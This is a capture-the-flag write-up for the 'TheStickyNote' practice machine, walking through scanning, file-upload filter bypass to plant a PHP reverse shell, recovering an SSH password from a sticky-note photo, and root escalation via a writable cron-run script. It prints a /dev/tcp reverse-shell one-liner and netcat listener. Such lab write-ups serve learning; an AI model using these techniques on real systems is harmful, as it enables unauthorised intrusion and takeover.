---
title: TheStickyNote
author: s0pln3rr0r
date: 2023-07-31 20:55:00 +0530
categories: [Writeups, Machines]
tags: [writeup]
---
## Enumeration
---
## Scanning 

```powershell
┌──(kali㉿kali)-[~/Desktop/CTFs/THM/TheStickyNote]
└─$ rustscan -a 10.10.51.33
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.51.33:22
Open 10.10.51.33:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")                                                                                                                                                                                   
                                                                                                                                                                                                                                            
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 01:11 EST                                                                                                                                                                         
Initiating Ping Scan at 01:11                                                                                                                                                                                                               
Scanning 10.10.51.33 [2 ports]                                                                                                                                                                                                              
Completed Ping Scan at 01:11, 0.15s elapsed (1 total hosts)                                                                                                                                                                                 
Initiating Parallel DNS resolution of 1 host. at 01:11                                                                                                                                                                                      
Completed Parallel DNS resolution of 1 host. at 01:11, 0.03s elapsed                                                                                                                                                                        
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                                                                                                            
Initiating Connect Scan at 01:11                                                                                                                                                                                                            
Scanning 10.10.51.33 [2 ports]                                                                                                                                                                                                              
Discovered open port 80/tcp on 10.10.51.33                                                                                                                                                                                                  
Discovered open port 22/tcp on 10.10.51.33                                                                                                                                                                                                  
Completed Connect Scan at 01:11, 0.15s elapsed (2 total ports)                                                                                                                                                                              
Nmap scan report for 10.10.51.33                                                                                                                                                                                                            
Host is up, received syn-ack (0.15s latency).                                                                                                                                                                                               
Scanned at 2023-03-01 01:11:56 EST for 0s                                                                                                                                                                                                   
                                                                                                                                                                                                                                            
PORT   STATE SERVICE REASON                                                                                                                                                                                                                 
22/tcp open  ssh     syn-ack                                                                                                                                                                                                                
80/tcp open  http    syn-ack                                                                                                                                                                                                                

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

Here we get to know that a website is running on `port 80`. Let's enumerate.

## Web Scanning

[![Pasted-image-20230301115221.png](https://i.postimg.cc/SN941zJ7/Pasted-image-20230301115221.png)](https://postimg.cc/8jTxjcdj)

Not so expected, even neither of the social media links seems working. Lets check source code.

[![Pasted-image-20230301115627.png](https://i.postimg.cc/L8Mpc6Pd/Pasted-image-20230301115627.png)](https://postimg.cc/4mwqtGww)

Moving on to directory and files bruteforcing. We will be using `feroxbuster` and `gobuster` for the same.



## Foothold
---

```powershell
┌──(kali㉿kali)-[~/Desktop/CTFs/THM/TheStickyNote]
└─$ feroxbuster -k -u http://10.10.51.33 -e -d 5 -t 240

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.51.33
 🚀  Threads               │ 240
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 5
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       69l      168w     1914c http://10.10.51.33/
403      GET        9l       28w      276c http://10.10.51.33/server-status
301      GET        9l       28w      308c http://10.10.51.33/bug => http://10.10.51.33/bug/
301      GET        9l       28w      316c http://10.10.51.33/bug/uploads => http://10.10.51.33/bug/uploads/
[####################] - 2m     60007/60007   0s      found:4       errors:5345   
[####################] - 2m     30000/30000   233/s   http://10.10.51.33/ 
[####################] - 2m     30000/30000   231/s   http://10.10.51.33/bug/ 
[####################] - 1s     30000/30000   0/s     http://10.10.51.33/bug/uploads/ => Directory listing
```

```powershell
┌──(kali㉿kali)-[~/Desktop/CTFs/THM/TheStickyNote]
└─$ gobuster dir -u http://10.10.51.33 -w /usr/share/wordlists/dirb/common.txt -o Directory_Files\ bruteforce.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.51.33
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/01 01:51:06 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/bug                  (Status: 301) [Size: 308] [--> http://10.10.51.33/bug/]
/index.html           (Status: 200) [Size: 1914]
/info.php             (Status: 200) [Size: 67751]
/server-status        (Status: 403) [Size: 276]
Progress: 4609 / 4615 (99.87%)
===============================================================
2023/03/01 01:52:43 Finished
===============================================================
```

Got some juicy directories.
1. `/bug`
2. `/bug/uploads`
3. `/info.php`
4. `/.htaccess`
5. `/.htpasswd`

```ad-note
- `.htaccess` and `.htpasswd` gave 403, so not of use
- But `info.php` gave us the output, so we can say that php execution is allowed in the server.
```

Now lets enumerate further about `/bug` and then `/bug/uploads/`.
In source code of `/bug`, we found a script
[![Pasted-image-20230419111301.png](https://i.postimg.cc/R0GxJk0N/Pasted-image-20230419111301.png)](https://postimg.cc/SXXvwtCh)

From Script we can get to know about file extension sanitization. But it's done on the client-end so it can easily be bypassed. 

Now lets focus back to `/bug/uploads`

[![Pasted-image-20230301121210.png](https://i.postimg.cc/qRYfjkr5/Pasted-image-20230301121210.png)](https://postimg.cc/FdjnKX7y)

Interesting, file upload form and directory index. What could be other then the shell upload. Lets try to upload a php shell. 

Lets's create one using [revshell](https://revshell.com) and try to upload.

[![Pasted-image-20230301123433.png](https://i.postimg.cc/QVG2Z0Hg/Pasted-image-20230301123433.png)](https://postimg.cc/GTK7kPP9)

Its blocking us from uploading any file having other then `.pdf` extension. Lets change the name of payload `pay.php.pdf` and burp it!

[![Pasted-image-20230301123750.png](https://i.postimg.cc/j2Jp1Gdd/Pasted-image-20230301123750.png)](https://postimg.cc/fSDqtq96)

Now interept it while uploading, and change the name of file from `pay.php.pdf` to `pay.php`

[![Pasted-image-20230301123916.png](https://i.postimg.cc/PqSnvWRh/Pasted-image-20230301123916.png)](https://postimg.cc/f3Sr69sg)

Forward rest of the requests. If everything is done correctly, file must have been uploaded in `/bug/uploads` directory we found earlier.

[![Pasted-image-20230301124323.png](https://i.postimg.cc/d0sK0Hn4/Pasted-image-20230301124323.png)](https://postimg.cc/YvsPnx5W)

Now lets start the listening server using `netcat` and run this `pay.php` to get our very first shell.

```powershell
┌──(kali㉿kali)-[~/Desktop/CTFs/THM/TheStickyNote]
└─$ rlwrap nc -lnvp 1234      
listening on [any] 1234 ...
connect to [10.11.27.117] from (UNKNOWN) [10.10.51.33] 60564
Linux TheStickyNote 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:44:55 up  1:58,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

BINGO! We succesfully got `w3 shell`. On further enumerating we found.

- In home directory we got a user named as - `jeffrey`
- w3 is not added to the sudoers

## Lateral Movement

Nothing specific. Lets get to our web directory to make sure we are not missing anything.

```bash
$ ls -la
total 24
drwxr-xr-x 4 root    root    4096 Feb 25 22:33 .
drwxr-xr-x 3 root    root    4096 Feb 25 12:39 ..
drwxrwxrwx 3 root    root    4096 Feb 26 00:38 bug
drwxr-xr-x 2 root    root    4096 Feb 26 00:03 c0NfiD3ntiA1
-rw-rw-r-- 1 jeffrey jeffrey 1914 Feb 25 13:12 index.html
-rw-r--r-- 1 root    root      20 Feb 25 14:15 info.php
```

I guess they got some ==confidential== stuff on their web server. Lets enumerate.

```bash
drwxr-xr-x 2 root root    4096 Feb 26 00:03 .
drwxr-xr-x 4 root root    4096 Feb 25 22:33 ..
-rw-r--r-- 1 root root 1609271 Feb 26 00:03 Level 3 Alert.eml
-rw-r--r-- 1 root root     324 Feb 25 23:46 readme.txt
```

`readme.txt` sounds something good, lets concat it.

```
$ cat readme.txt
Hello James,

My friend Alice(HR Department Head) had proposed me today, so I had to
get undercover for sometime. And I am changing my identity and leaving this job
for the same. I was assigned to send an email to jeffrey, I have drafted and 
saved it in the same folder. Can you please email him on my behalf.

~Web Dev
```

We got our very first flag

mmm... Lets not talk about the note and investigate `Level 3 Alert.eml` file. For that we'll need to download it, lets check if anything present on the victim machine that allows us for this.

```bash
$ which python3
/usr/bin/python3
$ which nc
/bin/nc
```

Lets make a python server using `python3 -m http.server <port>` to get the file

[![Pasted-image-20230301133428.png](https://i.postimg.cc/CxHgSTCR/Pasted-image-20230301133428.png)](https://postimg.cc/CR1ts2Q0)

```ad-hint
We can also make a copy of this file and transfer it to `/uploads` folder to download it. 
```

Now download and open this file in any .eml file viewer like [this one](https://www.encryptomatic.com/viewer/)

[![Pasted-image-20230301133845.png](https://i.postimg.cc/LXhKtJcP/Pasted-image-20230301133845.png)](https://postimg.cc/LYdbR864)

Company got social media lovers, mm not so great news for them. Lets download and check attachment, maybe we can retrieve password from it.

We got this image.

[![Pasted-image-20230301141424.png](https://i.postimg.cc/7LZYRZvH/Pasted-image-20230301141424.png)](https://postimg.cc/CR9gBYLX)

Let's reverse search it

[![Pasted-image-20230301141633.png](https://i.postimg.cc/ydw1WhDx/Pasted-image-20230301141633.png)](https://postimg.cc/sQ4dNh9C)

Anhaa... lets gather some information about this case.

On further infogathering we got zoomed image of that stickynote, on which password was written

[![Pasted-image-20230301142054.png](https://i.postimg.cc/vZzZX6N2/Pasted-image-20230301142054.png)](https://postimg.cc/sMMzg1y5)

Enchance it by using any [AI tool](https://www.cutout.pro/photo-enhancer-sharpener-upscaler) 

[![Pasted-image-20230301143458.png](https://i.postimg.cc/cHK1sk4P/Pasted-image-20230301143458.png)](https://postimg.cc/sQrCmcWJ)

```ad-tip
Still password is not clearly visible on note. You may need to try to understand what's written on it, and need to do manual bruteforce on `ssh`.
```

We got the password `wamvypoint2`. Lets check if jeffrey hadn't changed that.

```ruby
┌──(kali㉿kali)-[~/Desktop/CTFs/THM/TheStickyNote]
└─$ ssh jeffrey@10.10.83.77
The authenticity of host '10.10.83.77 (10.10.83.77)' can't be established.
ED25519 key fingerprint is SHA256:RrCU+uW+mWxVFgxrhgvbfHK9It/n3i8Ux3g1fhpH2wo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.83.77' (ED25519) to the list of known hosts.
jeffrey@10.10.83.77's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Tue Feb 28 19:29:13 2023
jeffrey@TheStickyNote:~$ 
```

BINGOO!! Now lets look for the user flag

[![Pasted-image-20230520110038.png](https://i.postimg.cc/XY8zsw6P/Pasted-image-20230520110038.png)](https://postimg.cc/87745f5d)



## Privilege Escalation 
---
On doing `ls -la` we got 4 suspicious directory
- .deped
- DoNotDelete
- .nano
- study material

Lets check each of them one by one.
Study material looks interesting, lets enumerate it first.

[![Pasted-image-20230520110207.png](https://i.postimg.cc/Dy1Db9jn/Pasted-image-20230520110207.png)](https://postimg.cc/svDKkNCN)
Poor jeffrey. Lets dig further into other files

[![Pasted-image-20230301150917.png](https://i.postimg.cc/3r4W7NkW/Pasted-image-20230301150917.png)](https://postimg.cc/Bt3JBqcG)

I guess we found our way to root, lets cat it

```bash
jeffrey@TheStickyNote:~/DoNotDelete$ cat script.sh 
#!/bin/bash

rand_num=$((RANDOM % 10 + 1))

for i in $(seq 1 $rand_num); do
  dd if=/dev/urandom of=/dev/null bs=1 count=1 >/dev/null 2>&1
done

function random_string {
  local length=$1
  local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  local result=''
  for i in $(seq 1 $length); do
    local rand_num=$((RANDOM % ${#chars}))
    result="$result${chars:$rand_num:1}"
  done
  echo "$result"
}

random_str=$(random_string 10)

count=0
while [ $count -lt 10 ]; do
  echo "$random_str"
  sleep 1
  count=$((count+1))
done

case $((RANDOM % 3)) in
  0) echo "Branch 0";;
  1) echo "Branch 1";;
  2) echo "Branch 2";;
esac
/home/jeffrey/.deped/deped.sh
fruits=("apple" "banana" "cherry" "date" "elderberry")

for fruit in "${fruits[@]}"; do
  echo "I like $fruit"
done

echo "3 * 5 + 7 = $(echo "3 5 7" | awk '{print $1 * $2 + $3}')"

curl --silent https://worldtimeapi.org/api/timezone/Europe/London.txt | grep "datetime"

ps aux

find / -type f -mtime -1 2>/dev/null
```

On analyzing we came to conclusion that this is entirely rubbish code, except **line 33** 
`/home/jeffrey/.deped/deped.sh` 

If their is dependencies updating script, there must me a cronjobs running it.
[![Pasted-image-20230301151853.png](https://i.postimg.cc/qv078GjC/Pasted-image-20230301151853.png)](https://postimg.cc/MvPxw1kW)

If its not ran by jeffrey, then possible root is running it. Lets find `deped.sh` file, and check wether its writeable or not

[![Pasted-image-20230301151337.png](https://i.postimg.cc/65C32PLX/Pasted-image-20230301151337.png)](https://postimg.cc/rKFc7QPn)

Yes it is writeable, lets make it run our reverse shell payload (again use revshell).
Payload that I am using:
```bash
sh -i >& /dev/tcp/10.11.27.117/9001 0>&1
```

[![Pasted-image-20230301151642.png](https://i.postimg.cc/sfkx2zWm/Pasted-image-20230301151642.png)](https://postimg.cc/F1xNP2Dk)

Setup your listener for getting the shell

[![Pasted-image-20230301152034.png](https://i.postimg.cc/3wfJQQ7g/Pasted-image-20230301152034.png)](https://postimg.cc/wtJdDP1v)


**WOOT WOOT!! SOMEONE IS THE ROOT!!**

Lets get the flag
[![Pasted-image-20230520110422.png](https://i.postimg.cc/GmrfPXVY/Pasted-image-20230520110422.png)](https://postimg.cc/JG6KM514)
